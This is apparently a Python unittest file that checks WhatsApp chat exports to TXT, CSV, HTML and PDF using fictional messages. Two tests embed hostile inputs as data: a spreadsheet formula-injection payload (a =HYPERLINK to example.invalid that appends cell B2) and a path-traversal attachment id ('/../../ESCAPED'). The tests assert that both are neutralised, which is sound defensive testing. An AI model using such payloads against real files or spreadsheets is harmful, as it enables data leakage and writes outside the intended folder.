"""
Saving WhatsApp chats (python/whatsapp.py): TXT, CSV, HTML and the PDF's HTML.

The messages here are hand-built in the shape ios-backup-core's
WhatsAppExtractor returns (fictional people and text), fed through a fake
source that pages them the way the library does: newest page first, each page
in arrival order. What must hold:

  * a chat keeps its arrival order (``sort``) even where the senders' clocks
    put dates out of order; a merged save interleaves chats by date but never
    reorders one;
  * notices have no "sender:" in front, and stand apart in HTML;
  * replies, reactions, calls and locations say what they are;
  * media comes from WhatsApp's own domain, named so it can't collide with
    Messages' files, and media the backup lacks is labelled, not a failure;
  * a store that can't be read fails the save instead of writing an empty file.
"""

import csv
import os
import re
import sys
import tempfile
import unittest
from datetime import timezone

from PIL import Image

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import whatsapp  # noqa: E402
from whatsapp import SHARED_DOMAIN, WhatsAppExtractor  # noqa: E402

UNREADABLE = "WhatsApp is in this backup but could not be read. The backup may be incomplete or damaged."


def _msg(message_id, sort, date, text="", *, sender="Riley Sample", from_me=False, message_type="text",
         event_text=None, attachments=None, quoted=None, reactions=None, call=None, location=None,
         starred=False, link_preview=None):
    return {
        "message_id": message_id, "sort": sort, "date": date, "text": text,
        "message_type": message_type, "event_text": event_text,
        "is_from_me": from_me, "sender": "me" if from_me else sender,
        "sender_handle": "", "sender_jid": "",
        "has_attachments": bool(attachments), "attachments": attachments or [],
        "is_reaction": False, "quoted": quoted, "reactions": reactions or [], "call": call,
        "location": location, "received_date": None, "event_code": None, "starred": starred,
        "vcard": None, "link_preview": link_preview,
    }


def _notice(message_id, sort, date, text):
    m = _msg(message_id, sort, date, message_type="system", event_text=text)
    m.update(sender="", is_from_me=False)
    return m


def _att(attachment_id, rel, mime, available=True, transfer_name=None, thumbnail_path=None):
    return {
        "attachment_id": attachment_id, "filename": rel if available else (rel or ""),
        "mime_type": mime, "transfer_name": transfer_name or os.path.basename(rel or "") or "Photo",
        "total_bytes": None, "thumbnail_path": thumbnail_path, "width": None, "height": None,
        "duration": None, "available": available,
    }


class FakeSource:
    """Pages and searches chats like ios-backup-core: newest page first, each page oldest first by sort."""

    def __init__(self, chats, search=None, error=None, empty_reason=None):
        self.chats = chats            # chat_id -> messages in arrival order
        self.search = search or {}    # query -> message ids
        self.error = error
        self.empty_reason = empty_reason
        self.pages_read = 0

    def get_messages(self, backup, chat_id, contacts, offset=0, limit=100, date_from=None, date_to=None):
        self.pages_read += 1
        messages = self.chats.get(chat_id, [])
        base = {"total": len(messages), "offset": offset, "limit": limit}
        if self.error or self.empty_reason:
            out = {"messages": [], **base, "total": 0, "next_offset": offset}
            if self.error:
                out["error"] = self.error
            if self.empty_reason:
                out["empty_reason"] = self.empty_reason
            return out
        newest_first = list(reversed(messages))[offset:offset + limit]
        return {"messages": list(reversed(newest_first)), **base, "next_offset": offset + len(newest_first)}

    def search_messages(self, backup, query, contacts, chat_id=None, date_from=None, date_to=None, limit=500):
        ids = self.search.get(query, [])
        rows = [m for m in self.chats.get(chat_id, []) if m["message_id"] in ids]
        rows.sort(key=lambda m: m["date"] or "")  # the library orders search by date
        return {"results": [{k: m[k] for k in ("message_id", "text", "date", "is_from_me", "sender")}
                            | {"chat_id": chat_id, "chat_name": "x"} for m in rows], "query": query}


class FakeBackup:
    """Files by (domain, relative path); records every lookup."""

    def __init__(self, files=None):
        self.files = files or {}
        self.lookups = []

    def get_file(self, relative_path, domain="HomeDomain"):
        self.lookups.append((domain, relative_path))
        return self.files.get((domain, relative_path))


D = "2024-03-01T12:{:02d}:00+00:00".format


class WhatsAppExportCase(unittest.TestCase):

    def setUp(self):
        self.wa = WhatsAppExtractor()
        self.wa.local_tz = timezone.utc
        out = tempfile.TemporaryDirectory()
        src = tempfile.TemporaryDirectory()
        self.addCleanup(out.cleanup)
        self.addCleanup(src.cleanup)
        self.out, self.src = out.name, src.name
        self.backup = FakeBackup()

    def source(self, chats, **kwargs):
        fake = FakeSource(chats, **kwargs)
        self.wa._inner = fake
        return fake

    def media(self, rel, data=None, image=None):
        path = os.path.join(self.src, f"f{len(self.backup.files)}")
        if image:
            Image.new("RGB", (40, 30), (10, 120, 200)).save(path, image)
        else:
            with open(path, "wb") as f:
                f.write(data if data is not None else os.urandom(64))
        self.backup.files[(SHARED_DOMAIN, rel)] = path
        return path

    def export(self, fmt, chat_id=1, **kwargs):
        result = self.wa.export_conversation(self.backup, chat_id, {}, fmt, self.out, **kwargs)
        self.assertNotIn("error", result, result)
        return result

    @staticmethod
    def read(result, encoding="utf-8"):
        with open(result["file"], encoding=encoding) as f:
            return f.read()


class TestOrder(WhatsAppExportCase):

    # Arrival order 1..5; message 4 arrived late with an earlier date, and
    # row ids (message_id) are in no particular order.
    CHAT = [
        _msg(30, 1, D(1), "first"),
        _msg(10, 2, D(2), "second"),
        _msg(50, 3, D(5), "third"),
        _msg(20, 4, D(3), "fourth, stamped early"),
        _msg(40, 5, D(6), "fifth"),
    ]

    def texts_in(self, text):
        return re.findall(r"(first|second|third|fourth, stamped early|fifth)", text)

    def test_every_format_keeps_arrival_order_across_pages(self):
        self.source({1: self.CHAT})
        whatsapp._EXPORT_PAGE, saved = 2, whatsapp._EXPORT_PAGE  # three pages
        self.addCleanup(setattr, whatsapp, "_EXPORT_PAGE", saved)
        want = ["first", "second", "third", "fourth, stamped early", "fifth"]
        for fmt in ("txt", "csv", "html", "pdf_source"):
            with self.subTest(fmt):
                result = self.export(fmt, display_name=f"Riley {fmt}")
                encoding = "utf-8-sig" if fmt in ("txt", "csv") else "utf-8"
                self.assertEqual(self.texts_in(self.read(result, encoding)), want)
                self.assertEqual(result["message_count"], 5)

    def test_a_late_message_stays_under_the_current_day_with_its_own_date(self):
        chat = [_msg(1, 1, "2024-03-01T23:50:00+00:00", "late evening"),
                _msg(2, 2, "2024-03-02T00:10:00+00:00", "after midnight"),
                _msg(3, 3, "2024-03-01T23:55:00+00:00", "arrived late"),
                _msg(4, 4, "2024-03-02T00:20:00+00:00", "next")]
        self.source({1: chat})
        page = self.read(self.export("html", display_name="Riley"))
        self.assertEqual(re.findall(r'<div class="day">([^<]+)</div>', page), ["Mar 1, 2024", "Mar 2, 2024"])
        self.assertIn('<div class="meta">Mar 1, 2024, 11:55 PM</div>', page)
        self.assertLess(page.index("after midnight"), page.index("arrived late"))

    def test_merged_interleaves_chats_by_date_without_reordering_either(self):
        other = [_msg(7, 1, D(4), "other chat, 12:04"), _msg(8, 2, D(0), "other chat, stamped 12:00")]
        self.source({1: self.CHAT, 2: other})
        result = self.wa.export_conversations(self.backup, [1, 2], {1: "Riley", 2: "Casey"}, {}, "txt",
                                              self.out, mode="merged")
        self.assertEqual(result["message_count"], 7)
        with open(result["files"][0], encoding="utf-8-sig") as f:
            lines = [line for line in f.read().splitlines() if line]
        mine = [line for line in lines if "(from Riley)" in line]
        self.assertEqual(self.texts_in("\n".join(mine)), ["first", "second", "third", "fourth, stamped early", "fifth"])
        self.assertLess(lines.index(next(x for x in lines if "12:04" in x)),
                        lines.index(next(x for x in lines if "stamped 12:00" in x)))
        self.assertEqual(os.path.basename(result["files"][0]), "all_whatsapp_chats.txt")

    def test_the_file_name_gives_the_earliest_and_latest_days(self):
        # Arrived last, but stamped the day before the first: the name must not run backwards.
        chat = [_msg(1, 1, "2024-03-01T12:00:00+00:00", "first"),
                _msg(2, 2, "2024-03-02T12:00:00+00:00", "second"),
                _msg(3, 3, "2024-02-28T12:00:00+00:00", "late, sender's clock behind")]
        self.source({1: chat})
        for fmt in ("txt", "csv", "html"):
            with self.subTest(fmt):
                result = self.export(fmt, display_name="Riley")
                self.assertTrue(os.path.basename(result["file"]).startswith("Riley, Feb 28 2024 - Mar 2 2024"))
                # ...while the file keeps arrival order
                text = self.read(result, "utf-8-sig" if fmt != "html" else "utf-8")
                self.assertLess(text.index("second"), text.index("late, sender"))

    def test_a_search_keeps_the_chat_order(self):
        self.source({1: self.CHAT}, search={"t": [50, 20, 30]})
        text = self.read(self.export("txt", query="t"), "utf-8-sig")
        self.assertEqual(self.texts_in(text), ["first", "third", "fourth, stamped early"])


class TestWhatTheyRead(WhatsAppExportCase):

    def chat(self):
        return [
            _notice(1, 1, D(0), "You created the group"),
            _msg(2, 2, D(1), "Hello from Riley", reactions=[
                {"emoji": "❤️", "sender": "You", "sender_handle": "", "is_from_me": True, "date": None},
                {"emoji": "👍", "sender": "Casey", "sender_handle": "", "is_from_me": False, "date": None}]),
            _msg(3, 3, D(2), "Reply to you", from_me=True, quoted={
                "message_id": 2, "text": "Hello from Riley", "message_type": "text", "is_from_me": False,
                "sender": "Riley Sample"}),
            _msg(4, 4, D(3), message_type="call", event_text="Missed voice call",
                 call={"is_video": False, "duration": 0, "outcome": "missed", "direction": "incoming"}),
            _msg(5, 5, D(4), from_me=True, message_type="shared_location", event_text="Location: Corner Cafe",
                 location={"latitude": 45.52, "longitude": -122.68, "live": False, "place_name": "Corner Cafe",
                           "thumbnail_path": None, "attachment_id": 9}),
            _msg(6, 6, D(5), message_type="deleted", event_text="This message was deleted"),
            _msg(7, 7, D(6), "Alex Example", message_type="contact"),
            _msg(8, 8, D(7), "about that photo", from_me=True, quoted={
                "message_id": None, "text": "", "message_type": "image", "is_from_me": True, "sender": "You"}),
            _msg(9, 9, D(8), "Lunch where?", message_type="poll", event_text="Poll"),
        ]

    def test_txt(self):
        self.source({1: self.chat()})
        lines = self.read(self.export("txt", display_name="Weekend Plans"), "utf-8-sig").splitlines()
        self.assertEqual(lines[0], "[Mar 1, 2024, 12:00 PM] You created the group")
        self.assertEqual(lines[1], "[Mar 1, 2024, 12:01 PM] Riley Sample: Hello from Riley [Reactions: ❤️ You, 👍 Casey]")
        self.assertEqual(lines[2], "[Mar 1, 2024, 12:02 PM] me: [Replying to Riley Sample: Hello from Riley] Reply to you")
        self.assertEqual(lines[3], "[Mar 1, 2024, 12:03 PM] Riley Sample: [Missed voice call]")
        self.assertEqual(lines[4], "[Mar 1, 2024, 12:04 PM] me: [Location: Corner Cafe] 45.52, -122.68")
        self.assertEqual(lines[5], "[Mar 1, 2024, 12:05 PM] Riley Sample: [This message was deleted]")
        self.assertEqual(lines[6], "[Mar 1, 2024, 12:06 PM] Riley Sample: [Contact card: Alex Example]")
        self.assertEqual(lines[7], "[Mar 1, 2024, 12:07 PM] me: [Replying to You: Photo] about that photo")
        self.assertEqual(lines[8], "[Mar 1, 2024, 12:08 PM] Riley Sample: [Poll] Lunch where?")

    def test_csv(self):
        self.source({1: self.chat()})
        with open(self.export("csv")["file"], newline="", encoding="utf-8-sig") as f:
            rows = list(csv.reader(f))
        self.assertEqual(rows[0], ["Date", "Sender", "Text", "Is From Me", "Has Attachments",
                                   "Type", "Replying To", "Reactions"])
        self.assertEqual(rows[1], ["2024-03-01T12:00:00+00:00", "", "You created the group", "False", "False",
                                   "WhatsApp notice", "", ""])
        self.assertEqual(rows[2][2:], ["Hello from Riley", "False", "False", "Text", "", "❤️ You, 👍 Casey"])
        self.assertEqual(rows[3][5:7], ["Text", "Riley Sample: Hello from Riley"])
        self.assertEqual(rows[4][2], "[Missed voice call]")
        self.assertEqual(rows[4][5], "Call")
        self.assertEqual(rows[5][2], "[Location: Corner Cafe] 45.52, -122.68")
        self.assertEqual(len(rows) - 1, 9)

    def test_csv_cells_never_become_formulas(self):
        """Text the sender wrote, starting with = + - @ or a tab, must stay text in Excel and LibreOffice."""
        formula = '=HYPERLINK("https://example.invalid/?"&B2,"Open")'
        chat = [
            _msg(1, 1, D(1), formula),
            _msg(2, 2, D(2), "fine by me", sender="+1 555 0100", quoted={
                "message_id": 1, "text": "@SUM(A1)", "message_type": "text", "is_from_me": False,
                "sender": "-Riley"}),
            _msg(3, 3, D(3), "-5 degrees out", reactions=[
                {"emoji": "+", "sender": "Casey", "sender_handle": "", "is_from_me": False, "date": None}]),
            _msg(4, 4, D(4), "\tindented"),
            _msg(5, 5, D(5), "\rcarriage"),
            _msg(6, 6, D(6), "a = b, no formula"),
        ]
        self.source({1: chat})
        with open(self.export("csv")["file"], newline="", encoding="utf-8-sig") as f:
            rows = list(csv.reader(f))
        self.assertEqual(rows[1][2], "'" + formula)
        self.assertEqual((rows[2][1], rows[2][2], rows[2][6]), ("'+1 555 0100", "fine by me", "'-Riley: @SUM(A1)"))
        self.assertEqual((rows[3][2], rows[3][7]), ("'-5 degrees out", "'+ Casey"))
        self.assertEqual(rows[4][2], "'\tindented")
        self.assertEqual(rows[5][2], "'\rcarriage")
        self.assertEqual(rows[6][2], "a = b, no formula")
        self.assertEqual(rows[1][0], "2024-03-01T12:01:00+00:00")  # dates and the rest as they were
        # Merged: the chat's name too
        result = self.wa.export_conversations(self.backup, [1], {1: "=Team"}, {}, "csv", self.out, mode="merged")
        with open(result["files"][0], newline="", encoding="utf-8-sig") as f:
            merged = list(csv.reader(f))
        self.assertEqual(merged[1][1:5], ["'=Team", "Received", "Riley Sample", "'" + formula])
        self.assertEqual(merged[2][3], "'+1 555 0100")

    def test_html(self):
        self.source({1: self.chat()})
        page = self.read(self.export("html", display_name="Weekend Plans"))
        self.assertIn("<title>WhatsApp chat: Weekend Plans</title>", page)
        self.assertIn('<div class="system">You created the group</div>', page)
        # A notice has no sender line and no bubble
        before = page[:page.index('<div class="system">')]
        self.assertNotIn('<div class="sender">', before[before.rindex('<div class="meta">'):])
        self.assertIn('<div class="quote"><div class="quote-who">Riley Sample</div>'
                      '<div class="quote-text">Hello from Riley</div></div>', page)
        self.assertIn('<div class="reactions">❤️ You, 👍 Casey</div>', page)
        self.assertIn('<div class="event">Missed voice call</div>', page)
        self.assertIn('<div class="event">Location: Corner Cafe</div><div class="coords">45.52, -122.68</div>', page)
        self.assertIn('<div class="event">Contact card: Alex Example</div>', page)
        self.assertNotIn("[Attachment]", page)
        self.assertIn("Made with OpenExtract", page)

    def test_merged_says_which_chat_and_notices_are_in_it(self):
        self.source({1: self.chat()[:2]})
        result = self.wa.export_conversations(self.backup, [1], {1: "Weekend Plans"}, {}, "txt", self.out,
                                              mode="merged")
        with open(result["files"][0], encoding="utf-8-sig") as f:
            lines = f.read().splitlines()
        self.assertEqual(lines[0], "[Mar 1, 2024, 12:00 PM] (in Weekend Plans) You created the group")
        self.assertTrue(lines[1].startswith("[Mar 1, 2024, 12:01 PM] (from Weekend Plans) Riley Sample: "))
        result = self.wa.export_conversations(self.backup, [1], {1: "Weekend Plans"}, {}, "csv", self.out,
                                              mode="merged")
        with open(result["files"][0], newline="", encoding="utf-8-sig") as f:
            rows = list(csv.reader(f))
        self.assertEqual(rows[0][:3], ["Date", "Conversation", "Direction"])
        self.assertEqual(rows[1][1:3], ["Weekend Plans", "Notice"])
        self.assertEqual(rows[0][-3:], ["Type", "Replying To", "Reactions"])

    def test_names_and_titles(self):
        self.source({1: self.chat()[:1], 2: []})
        result = self.export("txt", chat_id=2)
        self.assertEqual(os.path.basename(result["file"]), "whatsapp_chat_2.txt")
        self.assertEqual(result["message_count"], 0)
        result = self.export("html", chat_id=1)
        self.assertTrue(os.path.basename(result["file"]).startswith("whatsapp_chat_1"))
        self.assertIn("<title>WhatsApp chat</title>", self.read(result))
        named = self.export("txt", display_name="Weekend Plans")
        self.assertEqual(os.path.basename(named["file"]), "Weekend Plans, Mar 1 2024.txt")
        again = self.export("txt", display_name="Weekend Plans")
        self.assertEqual(os.path.basename(again["file"]), "Weekend Plans, Mar 1 2024 (2).txt")


class TestMedia(WhatsAppExportCase):

    IMG = "Message/Media/12025550101@s.whatsapp.net/a/b/photo.jpg"
    THUMB = "Message/Media/12025550101@s.whatsapp.net/a/b/photo.thumb"
    GONE = "Message/Media/12025550101@s.whatsapp.net/a/b/gone.jpg"
    VOICE = "Message/Media/12025550101@s.whatsapp.net/0/1/voice.opus"
    DOC = "Message/Media/12025550101@s.whatsapp.net/0/1/report.pdf"
    MAP = "Message/Media/12025550100@s.whatsapp.net/c/d/map.thumb"

    def chat(self):
        return [
            _msg(1, 1, D(1), "Caption here", message_type="image", attachments=[_att(5, self.IMG, "image/jpeg")]),
            _msg(2, 2, D(2), message_type="image",
                 attachments=[_att(6, "", "image/jpeg", available=False, thumbnail_path=self.THUMB)]),
            _msg(3, 3, D(3), message_type="image", attachments=[_att(7, "", None, available=False)]),
            _msg(4, 4, D(4), from_me=True, message_type="audio", attachments=[_att(8, self.VOICE, "audio/ogg")]),
            _msg(5, 5, D(5), message_type="document",
                 attachments=[_att(9, self.DOC, "application/pdf", transfer_name="Quarterly report.pdf")]),
            _msg(6, 6, D(6), message_type="document",
                 attachments=[_att(10, "", "application/pdf", available=False, transfer_name="Notes.pdf")]),
            _msg(7, 7, D(7), from_me=True, message_type="shared_location", event_text="Location",
                 location={"latitude": 1.5, "longitude": 2.25, "live": False, "place_name": None,
                           "thumbnail_path": self.MAP, "attachment_id": 11}),
            _msg(8, 8, D(8), message_type="image", attachments=[_att(12, self.GONE, "image/jpeg")]),
        ]

    def setUp(self):
        super().setUp()
        self.media(self.IMG, image="JPEG")
        self.media(self.THUMB, image="JPEG")
        self.media(self.VOICE, b"OggS fake opus")
        self.media(self.DOC, b"%PDF-1.4 fake")
        self.media(self.MAP, image="JPEG")
        self.source({1: self.chat()})

    def test_files_come_from_whatsapp_domain_only(self):
        self.export("html", display_name="Riley")
        self.assertTrue(self.backup.lookups)
        self.assertEqual({domain for domain, _ in self.backup.lookups}, {SHARED_DOMAIN})

    def test_html_copies_shows_and_plays(self):
        page = self.read(self.export("html", display_name="Riley"))
        folder = os.path.join(self.out, "Riley, Mar 1 2024_attachments")
        self.assertEqual(sorted(os.listdir(folder)),
                         ["wa5-photo.jpg", "wa6-thumb.jpg", "wa8-voice.opus",
                          "wa9-Quarterly report.pdf", "wamap11.jpg"])
        self.assertRegex(page, r'<img src="[^"]*wa5-photo\.jpg" alt="photo\.jpg"')
        self.assertIn('<div class="text">Caption here</div>', page)
        # Not in the backup, but its thumbnail is: the thumbnail and a label
        self.assertRegex(page, r'<img src="[^"]*wa6-thumb\.jpg" alt="Photo not in this backup">'
                               r'<div class="attachment-label">Photo not in this backup</div>')
        # Not in the backup at all: a label, without repeating the placeholder name
        self.assertIn('<div class="attachment-label">Photo not in this backup</div></div>', page)
        self.assertRegex(page, r'<audio controls preload="none" src="[^"]*wa8-voice\.opus"')
        self.assertRegex(page, r'<a href="[^"]*wa9-Quarterly%20report\.pdf">Document: Quarterly report\.pdf</a>')
        self.assertIn("Document not in this backup: Notes.pdf", page)
        self.assertRegex(page, r'<img class="map" src="[^"]*wamap11\.jpg" alt="Map">')
        self.assertIn('<div class="coords">1.5, 2.25</div>', page)
        # In the backup's list, but the file couldn't be read from it: not "not in this backup"
        self.assertIn("Photo couldn&#x27;t be read: gone.jpg", page)
        self.assertNotIn("not in this backup: gone.jpg", page)

    def test_pdf_source_writes_jpegs_and_labels_the_rest(self):
        page = self.read(self.export("pdf_source", display_name="Riley"))
        images = re.findall(r'<img[^>]* src="(attachments/[^"]+)"', page)
        self.assertEqual(images, ["attachments/wa5.jpg", "attachments/wa6-thumb.jpg", "attachments/wamap11.jpg"])
        for rel in images:
            with open(os.path.join(self.out, rel), "rb") as f:
                self.assertEqual(f.read(3), b"\xff\xd8\xff")
        self.assertIn('<div class="attachment-label">Voice message: voice.opus</div>', page)
        self.assertIn('<div class="attachment-label">Document: Quarterly report.pdf</div>', page)
        self.assertNotIn("<audio", page)
        self.assertNotIn("<video", page)

    def test_pdf_source_says_a_photo_it_cant_read_is_in_the_backup(self):
        damaged = "Message/Media/12025550101@s.whatsapp.net/e/f/damaged.jpg"
        raw = "Message/Media/12025550101@s.whatsapp.net/e/f/IMG_1.CR2"
        self.media(damaged, b"\xff\xd8\xff not really a JPEG")
        self.media(raw, b"\x00\x01 a camera's raw file, which Pillow can't read")
        self.source({1: [
            _msg(1, 1, D(1), message_type="image", attachments=[_att(21, damaged, "image/jpeg")]),
            _msg(2, 2, D(2), message_type="document",
                 attachments=[_att(22, raw, "image/x-canon-cr2", transfer_name="IMG_1.CR2")]),
            _msg(3, 3, D(3), message_type="image", attachments=[_att(23, self.GONE, "image/jpeg")]),
            _msg(4, 4, D(4), message_type="image", attachments=[_att(24, "", "image/jpeg", available=False)]),
        ]})
        page = self.read(self.export("pdf_source", display_name="Riley"))
        labels = re.findall(r'<div class="attachment-label">([^<]+)</div>', page)
        self.assertEqual(labels, ["Photo couldn&#x27;t be read: damaged.jpg",
                                  "Document: IMG_1.CR2",  # like any other document in a PDF
                                  "Photo couldn&#x27;t be read: gone.jpg",
                                  "Photo not in this backup"])

    def test_text_ids_from_a_hand_made_store_never_name_a_path(self):
        """The library passes ids through; a store with text ids mustn't write outside the export's folder."""
        escape = "/../../ESCAPED"
        self.source({1: [
            _msg(1, 1, D(1), message_type="image",
                 attachments=[_att(escape, "", "image/jpeg", available=False, thumbnail_path=self.THUMB)]),
            _msg(2, 2, D(2), message_type="image", attachments=[_att(escape + "2", self.IMG, "image/jpeg")]),
            _msg(3, 3, D(3), from_me=True, message_type="shared_location", event_text="Location",
                 location={"latitude": 1.5, "longitude": 2.25, "live": False, "place_name": None,
                           "thumbnail_path": self.MAP, "attachment_id": escape + "3"}),
        ]})
        # Windows resolves "wa/../.." without the "wa" folder existing; make it exist, to do the same here.
        for folder in ("Riley, Mar 1 2024_attachments", "attachments"):
            for prefix in ("wa", "wamap"):
                os.makedirs(os.path.join(self.out, folder, prefix))
        html_page = self.read(self.export("html", display_name="Riley"))
        pdf_page = self.read(self.export("pdf_source", display_name="Riley"))
        written = [os.path.relpath(os.path.join(d, f), self.out) for d, _, files in os.walk(self.out) for f in files]
        outside = [w for w in written if not w.startswith(("Riley, Mar 1 2024", "attachments" + os.sep))]
        self.assertEqual(outside, [])
        self.assertNotIn("ESCAPED", "".join(written) + html_page + pdf_page)
        self.assertEqual(len(re.findall(r'<img[^>]* src="attachments/wa(?:map)?x[0-9a-f]{12}(?:-thumb)?\.jpg"', pdf_page)), 3)

    def test_txt_labels(self):
        lines = self.read(self.export("txt"), "utf-8-sig").splitlines()
        self.assertTrue(lines[0].endswith("Riley Sample: Caption here [Photo: photo.jpg]"))
        self.assertTrue(lines[1].endswith("Riley Sample: [Photo not in this backup]"))
        self.assertTrue(lines[3].endswith("me: [Voice message: voice.opus]"))
        self.assertTrue(lines[5].endswith("[Document not in this backup: Notes.pdf]"))
        self.assertTrue(lines[6].endswith("me: [Location] 1.5, 2.25"))


class TestUnreadable(WhatsAppExportCase):

    def test_unreadable_store_fails_instead_of_writing_an_empty_file(self):
        self.source({1: []}, error=UNREADABLE)
        for fmt in ("txt", "csv", "html", "pdf_source"):
            with self.subTest(fmt):
                result = self.wa.export_conversation(self.backup, 1, {}, fmt, self.out, display_name="Riley")
                self.assertEqual(result, {"error": UNREADABLE})
        for mode in ("separate", "merged"):
            result = self.wa.export_conversations(self.backup, [1, 2], {}, {}, "txt", self.out, mode=mode)
            self.assertEqual(result, {"error": UNREADABLE})
        self.assertEqual(os.listdir(self.out), [])

    def test_not_in_backup_and_unknown_layout_say_so_calmly(self):
        self.source({1: []}, empty_reason="not_in_backup")
        result = self.wa.export_conversation(self.backup, 1, {}, "txt", self.out)
        self.assertEqual(result, {"error": "WhatsApp is not in this backup", "empty_reason": "not_in_backup"})
        self.source({1: []}, error="a layout this version can't read", empty_reason="unsupported_format")
        result = self.wa.export_conversation(self.backup, 1, {}, "html", self.out)
        self.assertEqual(result, {"error": "a layout this version can't read", "empty_reason": "unsupported_format"})
        self.assertEqual(os.listdir(self.out), [])

    def test_a_failed_search_fails_the_save(self):
        fake = self.source({1: [_msg(1, 1, D(1), "hi")]})
        fake.search_messages = lambda *a, **k: {"results": [], "query": "hi", "error": UNREADABLE}
        self.assertEqual(self.wa.export_conversation(self.backup, 1, {}, "txt", self.out, query="hi"),
                         {"error": UNREADABLE})

    def test_unsupported_format(self):
        fake = self.source({1: []})
        result = self.wa.export_conversation(self.backup, 1, {}, "docx", self.out)
        self.assertEqual(result, {"error": "Unsupported format: docx"})
        self.assertEqual(fake.pages_read, 0)
        self.assertEqual(self.wa.export_conversations(self.backup, [1], {}, {}, "docx", self.out),
                         {"error": "Unsupported format: docx"})

    def test_no_messages_extractor_underneath(self):
        """The export reads WhatsApp only: Messages' sms.db reader isn't there to be called by mistake."""
        self.assertIsNone(self.wa._export._inner)


if __name__ == "__main__":
    unittest.main()
